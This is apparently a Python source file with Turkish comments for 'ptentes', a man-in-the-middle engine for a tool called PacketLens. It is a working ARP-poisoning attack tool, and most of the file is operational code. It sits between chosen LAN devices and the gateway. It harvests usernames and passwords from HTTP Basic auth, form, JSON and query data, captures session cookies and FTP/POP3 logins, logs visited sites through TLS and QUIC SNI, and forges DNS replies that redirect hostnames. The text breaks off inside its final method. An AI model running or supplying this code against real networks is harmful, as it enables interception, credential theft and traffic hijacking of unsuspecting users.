#!/usr/bin/env python3
"""ptentes - PacketLens araya girme (MITM) motoru.

Hedef cihaz ile ağ geçidi arasına ARP sahteciliği ile girilir; trafik
çekirdek yönlendirmesiyle akmaya devam ederken motor bağlantıları izler:

  * ARP zehirleme (çift yönlü, periyodik yenileme, durunca geri alma)
  * Şifresiz HTTP istekleri: Host, yol, User-Agent, Basic auth ve form alanları
  * TLS ClientHello içinden SNI (hangi siteye gidildiği)
  * DNS sorguları ve isteğe bağlı DNS yanıtı yönlendirme (host -> IP)
  * Cihaz keşfi (yerel alt ağda ARP taraması)

Yalnızca Linux'ta çalışır (AF_PACKET) ve root yetkisi ister. Tüm durum
değişiklikleri geri alınır: durdurulduğunda ARP tablosu ve ip_forward eski
hâline döner.
"""
import atexit
import base64
import ipaddress
import json
import os
import re
import socket
import struct
import sys
import threading
import time
from urllib.parse import parse_qs, unquote_plus

ETH_IP = 0x0800
ETH_ARP = 0x0806
UDP = 17
TCP = 6
PACKET_MR_PROMISC = 1

MAX_EVENTS = 1500
MAX_CREDS = 400
MAX_COOKIES = 400
MAX_DNS = 2000
MAX_HOSTS = 500
TLS_PORTS = frozenset((443, 8443, 4443, 9443))
HTTP_PORTS = frozenset((80, 8080, 8000, 8888))
CLEARTEXT_PORTS = frozenset((21, 23, 25, 110, 143, 587))
MAX_ASM = 16384


def _read(path, default=''):
    try:
        with open(path) as f:
            return f.read().strip()
    except OSError:
        return default


def _ioctl_addr(name, req):
    try:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            r = fcntl.ioctl(s.fileno(), req, struct.pack('256s', name[:15].encode()))
        finally:
            s.close()
        return socket.inet_ntoa(r[20:24])
    except Exception:
        return ''


def iface_info(name):
    return {
        'name': name,
        'mac': _read('/sys/class/net/%s/address' % name).lower(),
        'ip': _ioctl_addr(name, 0x8915),
        'mask': _ioctl_addr(name, 0x891b),
    }


def default_gateway():
    for line in _read('/proc/net/route').split('\n')[1:]:
        f = line.split()
        if len(f) > 3 and f[1] == '00000000' and int(f[3], 16) & 2:
            try:
                ip = socket.inet_ntoa(struct.pack('<I', int(f[2], 16)))
            except Exception:
                ip = ''
            return f[0], ip
    return '', ''


def arp_table():
    out = {}
    for line in _read('/proc/net/arp').split('\n')[1:]:
        f = line.split()
        if len(f) >= 4 and f[3] != '00:00:00:00:00:00':
            out[f[0]] = f[3].lower()
    return out


def mac_bytes(mac):
    try:
        return bytes(int(x, 16) for x in mac.split(':'))
    except Exception:
        return b'\x00' * 6


def mac_str(raw):
    return ':'.join('%02x' % b for b in raw)


def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff


# ---------------------------------------------------------------- çerçeveler
def eth_header(dst, src, etype):
    return dst + src + struct.pack('!H', etype)


def ipv4_header(src, dst, proto, payload_len, ttl=64):
    total = 20 + payload_len
    hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total, 0, 0, ttl, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    return hdr[:10] + struct.pack('!H', checksum(hdr)) + hdr[12:]


def udp_header(src_ip, dst_ip, sport, dport, payload):
    length = 8 + len(payload)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack('!BBH', 0, UDP, length)
    hdr = struct.pack('!HHHH', sport, dport, length, 0)
    c = checksum(pseudo + hdr + payload)
    return struct.pack('!HHHH', sport, dport, length, c or 0xffff)


def arp_reply(eth_dst, spoof_mac, spoof_ip, target_mac, target_ip):
    body = struct.pack('!HHBBH', 1, ETH_IP, 6, 4, 2)
    body += spoof_mac + socket.inet_aton(spoof_ip) + target_mac + socket.inet_aton(target_ip)
    return eth_header(eth_dst, spoof_mac, ETH_ARP) + body


def arp_request(eth_dst, src_mac, src_ip, target_ip):
    body = struct.pack('!HHBBH', 1, ETH_IP, 6, 4, 1)
    body += src_mac + socket.inet_aton(src_ip) + b'\x00' * 6 + socket.inet_aton(target_ip)
    return eth_header(eth_dst, src_mac, ETH_ARP) + body


# ---------------------------------------------------------------- DNS
def dns_parse(pkt):
    """(txid, flags, ad, qtype, soru_sonu) döndürür; paket DNS değilse None."""
    if len(pkt) < 12:
        return None
    txid, flags, qd, an, ns, ar = struct.unpack('!HHHHHH', pkt[:12])
    if qd < 1:
        return None
    off, labels = 12, []
    for _ in range(64):
        if off >= len(pkt):
            return None
        ln = pkt[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0:
            return None
        labels.append(pkt[off + 1:off + 1 + ln].decode('latin1', 'replace'))
        off += 1 + ln
    if off + 4 > len(pkt):
        return None
    qtype, qclass = struct.unpack('!HH', pkt[off:off + 4])
    return txid, flags, '.'.join(labels), qtype, off + 4


def dns_answer(query, ip):
    parsed = dns_parse(query)
    if not parsed:
        return None
    txid, _flags, _name, qtype, end = parsed
    if qtype not in (1, 255):
        return None
    header = struct.pack('!HHHHHH', txid, 0x8180, 1, 1, 0, 0)
    ans = b'\xc0\x0c' + struct.pack('!HHIH', 1, 1, 45, 4) + socket.inet_aton(ip)
    return header + query[12:end] + ans


# ---------------------------------------------------------------- HTTP / TLS
REQ_RE = re.compile(r'^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT)\s+(\S+)\s+HTTP/\d', re.I)
USER_KEYS = ('user', 'username', 'login', 'email', 'mail', 'kullanici', 'kullanıcı')
PASS_KEYS = ('pass', 'password', 'pwd', 'parola', 'sifre', 'şifre')


def parse_http_response(payload):
    text = payload.decode('latin1', 'replace')
    if not text.startswith('HTTP/'):
        return None
    head, _, _body = text.partition('\r\n\r\n')
    lines = head.split('\r\n')
    headers = {}
    set_cookies = []
    status = lines[0] if lines else ''
    for ln in lines[1:]:
        if ':' in ln:
            k, v = ln.split(':', 1)
            k = k.strip().lower()
            v = v.strip()
            if k == 'set-cookie':
                set_cookies.append(v)
            else:
                headers[k] = v
    return {'status': status, 'headers': headers, 'set_cookies': set_cookies}


def parse_http(payload):
    text = payload.decode('latin1', 'replace')
    m = REQ_RE.match(text)
    if not m:
        return None
    head, _, body = text.partition('\r\n\r\n')
    lines = head.split('\r\n')
    headers, path = {}, ''
    parts = lines[0].split(' ')
    if len(parts) >= 2:
        path = parts[1]
    for ln in lines[1:]:
        if ':' in ln:
            k, v = ln.split(':', 1)
            headers[k.strip().lower()] = v.strip()
    return {'method': m.group(1).upper(), 'path': path, 'headers': headers, 'body': body}


def http_credentials(req):
    """İstekten (kullanıcı, parola) çıkarır."""
    out = []
    auth = req['headers'].get('authorization', '')
    if auth.lower().startswith('basic '):
        try:
            raw = base64.b64decode(auth.split(None, 1)[1] + '===').decode('utf-8', 'replace')
            if ':' in raw:
                out.append(('Basic auth', raw.split(':', 1)[0], raw.split(':', 1)[1]))
        except Exception:
            pass
    body = req['body']
    ctype = req['headers'].get('content-type', '')
    if body and ('application/x-www-form-urlencoded' in ctype or '=' in body):
        try:
            fields = parse_qs(body[:8192], keep_blank_values=True)
        except Exception:
            fields = {}
        user = passwd = ''
        for k in fields:
            lk = k.lower()
            if not user and any(lk == u or lk.startswith(u) for u in USER_KEYS):
                user = unquote_plus(fields[k][0])[:200]
            if not passwd and any(lk == p or lk.startswith(p) for p in PASS_KEYS):
                passwd = unquote_plus(fields[k][0])[:200]
        if user or passwd:
            out.append(('Form', user, passwd))
    ctype = req['headers'].get('content-type', '')
    if body and 'application/json' in ctype:
        try:
            data = json.loads(body[:8192])
        except (json.JSONDecodeError, TypeError):
            data = None
        if isinstance(data, dict):
            user = passwd = ''
            for k, v in data.items():
                if not isinstance(k, str):
                    continue
                lk = k.lower()
                val = v if isinstance(v, str) else (v[0] if isinstance(v, list) and v else '')
                if not isinstance(val, str):
                    continue
                if not user and any(lk == u or lk.endswith(u) for u in USER_KEYS):
                    user = val[:200]
                if not passwd and any(lk == p or lk.endswith(p) for p in PASS_KEYS):
                    passwd = val[:200]
            if user or passwd:
                out.append(('JSON', user, passwd))
    return out


def http_query_credentials(path):
    """GET isteği sorgu dizisinden kullanıcı/parola çıkarır."""
    if '?' not in path:
        return []
    try:
        q = path.split('?', 1)[1]
        fields = parse_qs(q[:4096], keep_blank_values=True)
    except Exception:
        return []
    user = passwd = ''
    for k in fields:
        lk = k.lower()
        if not user and any(lk == u or lk.startswith(u) for u in USER_KEYS):
            user = unquote_plus(fields[k][0])[:200]
        if not passwd and any(lk == p or lk.startswith(p) for p in PASS_KEYS):
            passwd = unquote_plus(fields[k][0])[:200]
    if user or passwd:
        return [('Query', user, passwd)]
    return []


def http_set_cookies(set_cookie_lines):
    """Set-Cookie başlıklarını (ad, değer) çiftlerine ayırır."""
    out = []
    for chunk in set_cookie_lines or []:
        chunk = chunk.strip()
        if not chunk:
            continue
        part = chunk.split(';', 1)[0]
        if '=' not in part:
            continue
        name, val = part.split('=', 1)
        name, val = name.strip(), val.strip()
        if name:
            out.append((name, val[:500]))
    return out


ECH_EXT = 0xFE0D


def _parse_clienthello_ext(q, o, end):
    """ClientHello uzantılarından SNI ve ECH bayrağı."""
    sni, ech = None, False
    ext_len = struct.unpack('!H', q[o:o + 2])[0]
    o += 2
    eend = min(len(q), o + ext_len, end)
    while o + 4 <= eend:
        etype, elen = struct.unpack('!HH', q[o:o + 4])
        o += 4
        if etype == ECH_EXT:
            ech = True
        elif etype == 0 and o + elen <= len(q):
            e = q[o:o + elen]
            if len(e) >= 5:
                nlen = struct.unpack('!H', e[3:5])[0]
                if 5 + nlen <= len(e):
                    sni = e[5:5 + nlen].decode('latin1', 'replace')
        o += elen
    return sni, ech


def tls_sni(payload):
    meta = tls_clienthello_meta(payload)
    return meta[0] if meta else None


def tls_clienthello_meta(payload):
    try:
        if len(payload) < 44 or payload[0] != 0x16 or payload[5] != 0x01:
            return None
        rec = struct.unpack('!H', payload[3:5])[0]
        q = payload[5:5 + rec]
        if len(q) < 4 or q[0] != 1:
            return None
        o = 4 + 2 + 32
        sid = q[o]
        o += 1 + sid
        cs = struct.unpack('!H', q[o:o + 2])[0]
        o += 2 + cs
        cm = q[o]
        o += 1 + cm
        sni, ech = _parse_clienthello_ext(q, o, len(q))
        return sni, ech
    except Exception:
        return None
    return None


def scan_quic_tls_sni(payload):
    """QUIC Initial içindeki TLS ClientHello'dan SNI ara."""
    if not payload or len(payload) < 48:
        return None
    lim = min(len(payload) - 44, 4096)
    for i in range(lim):
        if payload[i] == 0x16 and payload[i + 1] == 0x03 and payload[i + 5] == 0x01:
            meta = tls_clienthello_meta(payload[i:])
            if meta and meta[0]:
                return meta
    return None


# ---------------------------------------------------------------- motor
class Ptentes:
    """Araya girme oturumunun tamamını yöneten tekil motor."""

    def __init__(self):
        self.lock = threading.RLock()
        self._reset()
        atexit.register(self.stop)

    def _reset(self):
        self.running = False
        self.error = None
        self.iface = ''
        self.target = ''
        self.targets = []
        self.gateway = ''
        self.target_mac = ''
        self.gateway_mac = ''
        self.my_mac = ''
        self.my_ip = ''
        self.spoof_dns = True
        self.forward = True
        self.dns_map = {}
        self.started = 0.0
        self.events = []
        self.creds = []
        self.cookies = []
        self.dns_log = []
        self.hosts = {}
        self.stats = {'packets': 0, 'bytes': 0, 'http': 0, 'tls': 0, 'quic': 0, 'dns': 0,
                      'spoofed': 0, 'creds': 0, 'cookies': 0, 'arp': 0, 'arp_warn': 0, 'ech': 0}
        self._arp_warn_at = {}
        self.threads = []
        self.stop_ev = threading.Event()
        self._sock = None
        self._send = None
        self._ip_forward_prev = None
        self._ident = 0
        self.session_label = ''
        self.session_note = ''
        self._tcp_asm = {}

    # ------------------------------------------------------------ yardımcı
    def _ident_next(self):
        self._ident = (self._ident + 1) & 0xffff
        return self._ident

    def _learn(self, ip, mac=''):
        if not ip or ip.startswith('127.'):
            return
        with self.lock:
            h = self.hosts.get(ip)
            if not h:
                if len(self.hosts) >= MAX_HOSTS:
                    return
                h = {'ip': ip, 'mac': mac, 'first': time.time(), 'last': time.time(),
                     'packets': 0, 'bytes': 0}
                self.hosts[ip] = h
            if mac:
                h['mac'] = mac
            h['last'] = time.time()

    def _event(self, kind, src, dst, detail, sev='info'):
        with self.lock:
            self.events.append({'t': round(time.time(), 3), 'kind': kind, 'src': src,
                                'dst': dst, 'detail': detail, 'sev': sev})
            if len(self.events) > MAX_EVENTS:
                del self.events[:500]

    def _add_cred(self, host, proto, user, passwd):
        with self.lock:
            for c in self.creds:
                if c['host'] == host and c['proto'] == proto and c['user'] == user and c['pass'] == passwd:
                    c['t'] = round(time.time(), 3)
                    return
            if len(self.creds) >= MAX_CREDS:
                del self.creds[:100]
            self.creds.append({'t': round(time.time(), 3), 'host': host, 'proto': proto,
                               'user': user, 'pass': passwd})
            self.stats['creds'] += 1

    def _add_cookie(self, host, name, value, src_ip):
        with self.lock:
            for c in self.cookies:
                if c['host'] == host and c['name'] == name and c['value'] == value:
                    c['t'] = round(time.time(), 3)
                    c['src'] = src_ip
                    return
            if len(self.cookies) >= MAX_COOKIES:
                del self.cookies[:80]
            self.cookies.append({'t': round(time.time(), 3), 'host': host, 'name': name,
                                 'value': value, 'src': src_ip})
            self.stats['cookies'] += 1

    def _dns_target(self, host):
        host = host.lower().rstrip('.')
        if host in self.dns_map:
            return self.dns_map[host]
        for pat, ip in self.dns_map.items():
            if pat.startswith('*.') and host.endswith(pat[1:]):
                return ip
        return None

    # ------------------------------------------------------------ başlat
    def start(self, cfg):
        with self.lock:
            if self.running:
                return {'ok': False, 'error': 'ptentes zaten çalışıyor.'}
            if not sys.platform.startswith('linux'):
                return {'ok': False, 'error': 'ptentes yalnızca Linux üzerinde çalışır (AF_PACKET gerekli).'}
            if os.geteuid() != 0:
                return {'ok': False, 'error': 'ARP zehirleme için root gerekir: sudo python3 packetlens.py'}

            iface = (cfg.get('iface') or '').strip()
            raw_targets = cfg.get('targets') or []
            if isinstance(raw_targets, str):
                raw_targets = [x.strip() for x in raw_targets.replace(';', ',').split(',') if x.strip()]
            target = (cfg.get('target') or '').strip()
            if not raw_targets and target:
                raw_targets = [target]
            targets = []
            for t in raw_targets:
                try:
                    ipaddress.IPv4Address(t)
                except Exception:
                    return {'ok': False, 'error': 'Geçersiz hedef IP: %s' % t}
                if t not in targets:
                    targets.append(t)
            if len(targets) > 8:
                return {'ok': False, 'error': 'En fazla 8 hedef cihaz seçilebilir.'}
            if not iface or not targets:
                return {'ok': False, 'error': 'Arayüz ve en az bir hedef IP zorunlu.'}
            target = targets[0]

            info = iface_info(iface)
            if not info['mac'] or not info['ip']:
                return {'ok': False, 'error': 'Arayüz bilgisi okunamadı: %s' % iface}
            if not info['mask']:
                info['mask'] = '255.255.255.0'

            try:
                net = ipaddress.IPv4Network('%s/%s' % (info['ip'], info['mask']), strict=False)
            except Exception:
                return {'ok': False, 'error': 'Alt ağ hesaplanamadı.'}
            for t in targets:
                if ipaddress.IPv4Address(t) not in net:
                    return {'ok': False, 'error': 'Hedef %s, %s ağında değil (%s).' % (t, net, info['ip'])}
                if t == info['ip']:
                    return {'ok': False, 'error': 'Hedef bu makinenin kendi IP adresi olamaz: %s' % t}

            gw_ip = (cfg.get('gateway') or '').strip()
            if not gw_ip:
                gw_if, gw_ip = default_gateway()
                if not gw_ip:
                    return {'ok': False, 'error': 'Ağ geçidi bulunamadı; elle girin.'}
            try:
                ipaddress.IPv4Address(gw_ip)
            except Exception:
                return {'ok': False, 'error': 'Geçersiz ağ geçidi: %s' % gw_ip}
            if gw_ip in targets:
                return {'ok': False, 'error': 'Ağ geçidi hedef listesinde olamaz.'}
            if gw_ip == info['ip']:
                return {'ok': False, 'error': 'Ağ geçidi bu makinenin IP adresi olamaz.'}

            self._reset()
            self.iface, self.target, self.gateway = iface, target, gw_ip
            self.targets = []
            self.my_mac, self.my_ip = info['mac'], info['ip']
            self.spoof_dns = bool(cfg.get('dns_spoof', True))
            self.forward = bool(cfg.get('forward', True))
            self.dns_map = {str(k).lower().rstrip('.'): str(v) for k, v in (cfg.get('dns_map') or {}).items()
                            if str(k).strip() and _valid_ip(str(v))}
            self.session_label = str(cfg.get('session_label') or '')[:120]
            self.session_note = str(cfg.get('session_note') or '')[:2000]
            self._tcp_asm = {}

            try:
                self._sock = self._open_socket(iface)
                self._send = self._open_socket(iface)
            except PermissionError:
                self._close()
                return {'ok': False, 'error': 'Ham soket açılamadı: root gerekir.'}
            except OSError as e:
                self._close()
                return {'ok': False, 'error': 'Arayüz açılamadı: %s' % e}

            self.gateway_mac = self._resolve_mac(gw_ip, info['mac'], info['ip'])
            if not self.gateway_mac:
                self._close()
                return {'ok': False, 'error': 'Ağ geçidinin MAC adresi bulunamadı: %s' % gw_ip}
            for t in targets:
                tmac = self._resolve_mac(t, info['mac'], info['ip'])
                if not tmac:
                    self._close()
                    return {'ok': False, 'error': 'Hedefin MAC adresi bulunamadı: %s' % t}
                self.targets.append({'ip': t, 'mac': tmac})
            self.target_mac = self.targets[0]['mac']

            if self.forward:
                self._ip_forward_prev = _read('/proc/sys/net/ipv4/ip_forward', '0')
                self._write('/proc/sys/net/ipv4/ip_forward', '1')

            self.stop_ev.clear()
            self.running = True
            self.started = time.time()
            tgt_label = ', '.join(targets) if len(targets) > 1 else target
            self._event('start', tgt_label, gw_ip, 'ARP zehirleme başladı (%s üzerinden, %d hedef)' % (iface, len(targets)), 'ok')
            for fn in (self._arp_loop, self._sniff_loop):
                t = threading.Thread(target=fn, daemon=True)
                t.start()
                self.threads.append(t)
            return {'ok': True, 'target_mac': self.target_mac, 'gateway_mac': self.gateway_mac,
                    'targets': list(self.targets)}

    def _open_socket(self, iface):
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        s.bind((iface, 0))
        try:
            s.setsockopt(263, PACKET_MR_PROMISC,
                         struct.pack('iHH8s', socket.if_nametoindex(iface), 1, 0, b'\0' * 8))
        except OSError:
            pass
        s.settimeout(0.3)
        return s

    @staticmethod
    def _write(path, val):
        try:
            with open(path, 'w') as f:
                f.write(val)
            return True
        except OSError:
            return False

    def _resolve_mac(self, ip, my_mac, my_ip, timeout=2.0):
        mac = arp_table().get(ip)
        if mac:
            return mac
        req = arp_request(b'\xff' * 6, mac_bytes(my_mac), my_ip, ip)
        for _ in range(4):
            try:
                self._send.send(req)
            except OSError:
                pass
            time.sleep(0.35)
            mac = arp_table().get(ip)
            if mac:
                return mac
        return ''

    # ------------------------------------------------------------ ARP döngüsü
    def _arp_loop(self):
        gmac = mac_bytes(self.gateway_mac)
        mymac = mac_bytes(self.my_mac)
        pairs = [(mac_bytes(t['mac']), t['ip']) for t in self.targets] or [(mac_bytes(self.target_mac), self.target)]
        while not self.stop_ev.is_set():
            try:
                for tmac, tip in pairs:
                    # hedefe: "ağ geçidi benim" · ağ geçidine: "hedef benim"
                    self._send.send(arp_reply(tmac, mymac, self.gateway, tmac, tip))
                    self._send.send(arp_reply(gmac, mymac, tip, gmac, self.gateway))
                with self.lock:
                    self.stats['arp'] += 2 * len(pairs)
            except OSError:
                pass
            self.stop_ev.wait(1.8)

    # ------------------------------------------------------------ dinleme
    def _sniff_loop(self):
        while not self.stop_ev.is_set():
            try:
                frame, _addr = self._sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._handle(frame)
            except Exception:
                # Bozuk/eksik bir çerçeve motoru durdurmasın.
                continue

    def _handle(self, frame):
        if len(frame) < 14:
            return
        src_mac, dst_mac = frame[0:6], frame[6:12]
        etype = struct.unpack('!H', frame[12:14])[0]

        if etype == ETH_ARP:
            if len(frame) >= 42:
                op = struct.unpack('!H', frame[20:22])[0]
                if op in (1, 2):
                    sha = mac_str(frame[22:28])
                    spa = socket.inet_ntoa(frame[28:32])
                    self._learn(spa, sha)
                    if self.running and op == 2 and sha != self.my_mac:
                        self._arp_conflict(spa, sha)
            return
        if etype == 0x86DD and len(frame) >= 54:
            self._icmpv6_ndp(frame[14:])
            return
        if etype != ETH_IP:
            return

        p = frame[14:]
        if len(p) < 20 or (p[0] >> 4) != 4:
            return
        ihl = (p[0] & 15) * 4
        total = struct.unpack('!H', p[2:4])[0]
        proto = p[9]
        frag = struct.unpack('!H', p[6:8])[0]
        if frag & 0x1FFF:
            return
        src_ip = socket.inet_ntoa(p[12:16])
        dst_ip = socket.inet_ntoa(p[16:20])
        seg = p[ihl:min(total, len(p))]
        self._learn(src_ip, mac_str(src_mac))

        with self.lock:
            self.stats['packets'] += 1
            self.stats['bytes'] += len(frame)
            h = self.hosts.get(src_ip)
            if h:
                h['packets'] += 1
                h['bytes'] += len(frame)

        if proto == 1 and len(seg) >= 8:
            self._icmp(src_ip, dst_ip, seg)
        elif proto == UDP and len(seg) >= 8:
            sport, dport, ulen = struct.unpack('!HHH', seg[:6])
            payload = seg[8:min(ulen, len(seg))]
            if dport == 53 or sport == 53:
                self._dns(src_ip, dst_ip, sport, dport, payload, mac_str(src_mac))
            elif dport == 443 or sport == 443:
                qm = scan_quic_tls_sni(payload)
                if qm:
                    name, ech = qm[0], qm[1]
                    with self.lock:
                        self.stats['quic'] += 1
                        if ech:
                            self.stats['ech'] += 1
                    detail = 'QUIC SNI: %s' % name
                    if ech:
                        detail += ' (ECH)'
                    self._event('quic', src_ip, name, detail)
                    self._learn(name, '')
        elif proto == TCP and len(seg) >= 20:
            sport, dport, off_flags = struct.unpack('!HHI', seg[:8])
            doff = (off_flags >> 12) * 4
            payload = seg[doff:]
            if not payload:
                return
            if sport in HTTP_PORTS or dport in HTTP_PORTS:
                self._http_asm(src_ip, dst_ip, sport, dport, payload)
            elif sport in CLEARTEXT_PORTS or dport in CLEARTEXT_PORTS:
                self._cleartext(src_ip, dst_ip, sport, dport, payload)
            elif sport in TLS_PORTS or dport in TLS_PORTS:
                if payload and payload[0] == 0x16:
                    meta = tls_clienthello_meta(payload)
                    if meta and meta[0]:
                        name, ech = meta
                        with self.lock:
                            self.stats['tls'] += 1
                            if ech:
                                self.stats['ech'] += 1
                        detail = 'TLS bağlantısı: %s' % name
                        if ech:
                            detail += ' (ECH)'
                        self._event('tls', src_ip, name, detail)
                        self._learn(name, '')

    def _arp_conflict(self, spa, sha):
        """Hedef veya ağ geçidi gerçek MAC ile geri bildirildiğinde uyar (ARP savaşı / DAI)."""
        if spa == self.gateway and sha != self.gateway_mac:
            role, legit = 'gateway', self.gateway_mac
        else:
            hit = next((t for t in self.targets if t['ip'] == spa and sha != t['mac']), None)
            if not hit:
                if spa == self.target and sha != self.target_mac:
                    role, legit = 'target', self.target_mac
                else:
                    return
            else:
                role, legit = 'target', hit['mac']
        key = spa + '|' + sha
        now = time.time()
        with self.lock:
            if now - self._arp_warn_at.get(key, 0) < 8:
                return
            self._arp_warn_at[key] = now
            self.stats['arp_warn'] += 1
        self._event('arp-conflict', spa, sha,
                    '%s için rakip ARP: %s (beklenen %s) — izolasyon veya DAI olabilir' % (role, sha, legit),
                    'warn')

    def _icmp(self, src_ip, dst_ip, seg):
        if len(seg) < 8:
            return
        typ, code = seg[0], seg[1]
        target_ips = {t['ip'] for t in self.targets} or {self.target}
        watch = src_ip in target_ips or dst_ip in target_ips
        if not watch:
            return
        if typ == 8:
            self._event('icmp', src_ip, dst_ip, 'Echo isteği (ping)', 'info')
        elif typ == 0:
            self._event('icmp', src_ip, dst_ip, 'Echo yanıtı', 'info')
        elif typ == 11:
            self._event('icmp', src_ip, dst_ip, 'TTL aşımı (traceroute olabilir)', 'warn')
        elif typ == 3:
            self._event('icmp', src_ip, dst_ip, 'ICMP hata kod=%d' % code, 'warn')

    def _icmpv6_ndp(self, p):
        if len(p) < 48 or p[6] != 58:
            return
        off = 40
        if off >= len(p):
            return
        typ = p[off]
        if typ in (133, 134, 135, 136):
            self._event('ndp', socket.inet_ntop(socket.AF_INET6, p[8:24]), typ, 'IPv6 komşu keşfi (NDP)', 'info')

    def _http_asm(self, src_ip, dst_ip, sport, dport, payload):
        key = (src_ip, sport, dst_ip, dport)
        buf = self._tcp_asm.get(key, b'') + payload
        if len(buf) > MAX_ASM:
            buf = buf[-MAX_ASM:]
        self._tcp_asm[key] = buf
        if b'\r\n\r\n' not in buf and len(buf) < 400:
            return
        self._http(src_ip, dst_ip, sport, dport, buf)
        if b'\r\n\r\n' in buf:
            del self._tcp_asm[key]

    def _cleartext(self, src_ip, dst_ip, sport, dport, payload):
        text = payload.decode('latin1', 'replace')
        port = dport if dport in CLEARTEXT_PORTS else sport
        if port == 21:
            for line in text.split('\n'):
                if line.upper().startswith('USER '):
                    self._event('ftp', src_ip, dst_ip, line.strip()[:120], 'warn')
                if line.upper().startswith('PASS '):
                    self._event('ftp', src_ip, dst_ip, 'FTP PASS (gizlendi)', 'bad')
        elif port in (25, 587):
            if 'AUTH PLAIN' in text.upper():
                self._event('smtp', src_ip, dst_ip, 'SMTP AUTH PLAIN', 'bad')
        elif port == 110 and text.upper().startswith('USER '):
            self._event('pop3', src_ip, dst_ip, text.strip()[:80], 'warn')
        elif port == 143 and ' LOGIN ' in text.upper():
            self._event('imap', src_ip, dst_ip, 'IMAP LOGIN', 'bad')
        elif port == 23:
            self._event('telnet', src_ip, dst_ip, 'Telnet oturumu (düz metin)', 'bad')

    def _dns(self, src_ip, dst_ip, sport, dport, payload, src_mac):
        parsed = dns_parse(payload)
        if not parsed:
            return
        txid, flags, name, qtype, _end = parsed
        is_resp = bool(flags & 0x8000)
        rcode = (flags >> 4) & 0xF if is_resp else None
        if not name:
            return
        with self.lock:
            self.stats['dns'] += 1
            self.dns_log.append({'t': round(time.time(), 3), 'client': src_ip if not is_resp else dst_ip,
                                 'name': name, 'qtype': qtype, 'spoofed': False, 'rcode': rcode,
                                 'response': is_resp})
            if len(self.dns_log) > MAX_DNS:
                del self.dns_log[:500]
        if is_resp:
            if rcode == 3:
                self._event('dns-nx', dst_ip, name, 'NXDOMAIN: %s' % name, 'warn')
            return

        target_ip = self._dns_target(name) if self.spoof_dns else None
        if target_ip and dport == 53:
            ans = dns_answer(payload, target_ip)
            if ans:
                frame = eth_header(mac_bytes(src_mac), mac_bytes(self.my_mac), ETH_IP)
                frame += ipv4_header(dst_ip, src_ip, UDP, 8 + len(ans))
                frame += udp_header(dst_ip, src_ip, 53, sport, ans)
                try:
                    self._send.send(frame)
                    with self.lock:
                        self.stats['spoofed'] += 1
                        if self.dns_log:
                            self.dns_log[-1]['spoofed'] = True
                            self.dns_log[-1]['answer'] = target_ip
                    self._event('dns-spoof', src_ip, name, '%s -> %s' % (name, target_ip), 'warn')
                except OSError:
                    pass
        else:
            self._event('dns', src_ip, name, name, 'info')

    def _http(self, src_ip, dst_ip, sport, dport, payload):
        req = parse_http(payload)
        if req:
            host = req['headers'].get('host', dst_ip if dport in HTTP_PORTS else src_ip)
            with self.lock:
                self.stats['http'] += 1
            self._event('http', src_ip, host, '%s %s%s' % (req['method'], host, req['path']), 'info')
            for proto, user, passwd in http_credentials(req):
                self._add_cred(host, proto, user, passwd)
                self._event('cred', src_ip, host, '%s kimlik bilgisi: %s' % (proto, user or '—'), 'bad')
            for proto, user, passwd in http_query_credentials(req['path']):
                self._add_cred(host, proto, user, passwd)
                self._event('cred', src_ip, host, '%s kimlik bilgisi: %s' % (proto, user or '—'), 'bad')
            return
        resp = parse_http_response(payload)
        if not resp:
            return
        host = src_ip if sport in HTTP_PORTS else dst_ip
        for name, val in http_set_cookies(resp.get('set_cookies')):
            self._add_cookie(host, name, val, src_ip)
            self._event('cookie', src_ip, host, 'Set-Cookie: %s' % name, 'warn')

    # ------------------------------------------------------------ durum
    def status(self):
        with self.lock:
            return {
                'running': self.running,
                'error': self.error,
                'iface': self.iface,
                'target': self.target,
                'targets': list(self.targets),
                'gateway': self.gateway,
                'target_mac': self.target_mac,
                'gateway_mac': self.gateway_mac,
                'my_mac': self.my_mac,
                'my_ip': self.my_ip,
                'dns_spoof': self.spoof_dns,
                'forward': self.forward,
                'dns_map': self.dns_map,
                'session_label': self.session_label,
                'session_note': self.session_note,
                'target_ips': [t['ip'] for t in self.targets] or ([self.target] if self.target else []),
                'started': self.started,
                'uptime': round(time.time() - self.started, 1) if self.started else 0,
                'stats': dict(self.stats),
                'events': list(self.events),
                'creds': list(self.creds),
                'cookies': list(self.cookies),
                'dns': list(self.dns_log),
                'hosts': sorted(self.hosts.values(), key=lambda h: h['last'], reverse=True),
                'platform': sys.platform,
                'root': os.geteuid() == 0,
            }

    def set_dns_map(self, mapping):
        with self.lock:
            self.dns_map = {str(k).lower().rstrip('.'): str(v) for k, v in (mapping or {}).items()
                            if str(k).strip() and _valid_ip(str(v))}
            return dict(self.dns_map)

    def report(self):
        st = self.status()
        return {'tool': 'ptentes', 'generated': time.time(), 'session': st, 'label': self.session_label, 'note': self.session_note}

    # ------------------------------------------------------------ durdur
    def stop(self):
        with self.lock:
            was_running = self.running
            self.running = False
            self.stop_ev.set()
        for t in list(self.threads):
            t.join(timeout=1.5)
        self.threads = []
        if was_running and self._send and self.gateway_mac:
            # Doğru eşlemeleri geri gönder: ağ sessizce eski hâline dönsün.
            try:
                gmac = mac_bytes(self.gateway_mac)
                pairs = [(mac_bytes(t['mac']), t['ip']) for t in self.targets] or [(mac_bytes(self.target_mac), self.target)]
                for _ in range(5):
                    for tmac, tip in pairs:
                        self._send.send(arp_reply(tmac, gmac, self.gateway, tmac, tip))
                        self._send.send(arp_reply(gmac, tmac, tip, gmac, self.gateway))
                    time.sleep(0.15)
            except OSError:
                pass
            self._event('stop', self.target, self.gateway, 'ARP tablosu geri alındı', 'ok')
        if self._ip_forward_prev is not None:
            self._write('/proc/sys/net/ipv4/ip_forward', self._ip_forward_prev)
            self._ip_forward_prev = None
        self._close()
        return {'ok': True}

    def _close(self):
